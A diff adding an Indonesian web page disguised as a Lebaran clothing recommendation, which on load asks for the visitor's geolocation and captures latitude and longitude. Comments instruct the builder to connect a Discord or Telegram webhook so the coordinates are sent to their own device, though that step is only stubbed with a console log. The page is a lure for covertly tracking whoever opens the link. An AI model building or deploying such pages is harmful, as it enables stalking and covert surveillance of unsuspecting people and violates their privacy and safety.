@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Koleksi Baju Lebaran 2026</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f9f9f9; padding: 20px; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 15px; shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        img { width: 100%; border-radius: 10px; margin-top: 15px; }
+        h2 { color: #5d4037; }
+    </style>
+</head>
+<body onload="getLocation()">
+
+    <div class="container">
+        <h2>Rekomendasi Gamis Lebaran ✨</h2>
+        <p>Coba lihat model ini, cocok banget buat kamu!</p>
+        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?q=80&w=1000" alt="Baju Lebaran">
+        <p id="status"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                console.log("Geolocation tidak didukung browser ini.");
+            }
+        }
+
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Di sini kamu perlu integrasi dengan backend atau webhook (seperti Discord/Telegram)
+            // untuk mengirim data lat & lon ke perangkatmu.
+            console.log("Lokasi didapat: " + lat + ", " + lon);
+        }
+
+        function showError(error) {
+            console.log("User menolak akses lokasi.");
+        }
+    </script>
+</body>
+</html>
